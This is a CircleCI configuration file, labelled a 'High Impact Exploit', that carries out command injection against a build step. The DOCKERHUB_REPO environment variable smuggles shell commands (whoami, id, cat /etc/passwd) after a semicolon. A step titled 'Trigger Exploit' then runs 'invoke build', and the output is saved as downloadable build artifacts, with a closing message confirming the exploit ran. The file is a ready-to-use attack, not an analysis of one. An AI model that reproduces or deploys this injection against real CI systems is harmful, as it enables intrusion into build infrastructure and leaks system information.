# .circleci/config.yml (High Impact Exploit)
version: 2.1

jobs:
  full:
    docker:
      - image: cimg/base:stable
    # --- HIGH IMPACT PAYLOAD ---
    environment:
      DOCKERHUB_REPO: 'mozilla/phabricator; whoami > /tmp/artifacts/info.txt; id >> /tmp/artifacts/info.txt; cat /etc/passwd > /tmp/artifacts/passwd.txt'
    # ---------------------------
    steps:
      - setup_remote_docker
      - checkout
      - run:
          name: Pre-setup artifacts
          command: mkdir -p /tmp/artifacts
      - run:
          name: Install dependencies
          command: |
            sudo apt-get update && sudo apt-get install -y python3-pip
            pip install invoke
      - run:
          name: Trigger Exploit
          command: invoke build
      - store_artifacts:
          path: /tmp/artifacts
      - run:
          name: Debug (Optional)
          command: |
            echo "Exploit executed. Check Artifacts tab for info.txt and passwd.txt"

workflows:
  main:
    jobs:
      - full
